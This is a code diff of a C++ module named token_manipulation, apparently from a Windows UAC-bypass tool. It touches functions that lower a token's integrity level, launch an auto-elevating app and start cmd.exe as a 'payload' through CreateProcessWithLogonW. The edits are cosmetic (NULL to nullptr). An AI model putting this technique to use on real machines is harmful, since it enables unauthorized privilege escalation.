@@ -153,7 +153,7 @@ bool token_manipulation::is_process_admin(HANDLE process)
 bool token_manipulation::lower_token_il(HANDLE token_handle)
 {
 	SID_IDENTIFIER_AUTHORITY authority = SECURITY_MANDATORY_LABEL_AUTHORITY;
-	PSID integrity_sid = NULL;
+	PSID integrity_sid = nullptr;
 	auto status = ntdll::RtlAllocateAndInitializeSid(&authority,1, SECURITY_MANDATORY_MEDIUM_RID, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &integrity_sid);
 
 	if (!NT_SUCCESS(status))
@@ -187,7 +187,6 @@ bool token_manipulation::launch_auto_elevating_app(HANDLE* process_handle)
 		std::cout << "[!] ShellExecuteEx failed" << std::endl;
 		return false;
 	}
-
 	*process_handle = shinfo.hProcess;
 
 	return true;
@@ -232,7 +231,7 @@ bool token_manipulation::launch_payload()
 	auto result = CreateProcessWithLogonW(TEXT("."), TEXT("."), TEXT("."),
 		LOGON_NETCREDENTIALS_ONLY,
 		L"C:\\Windows\\System32\\cmd.exe",
-		NULL, 0, NULL, NULL,
+		NULL, 0, NULL, nullptr,
 		&si, &pi);
 
 	return result;
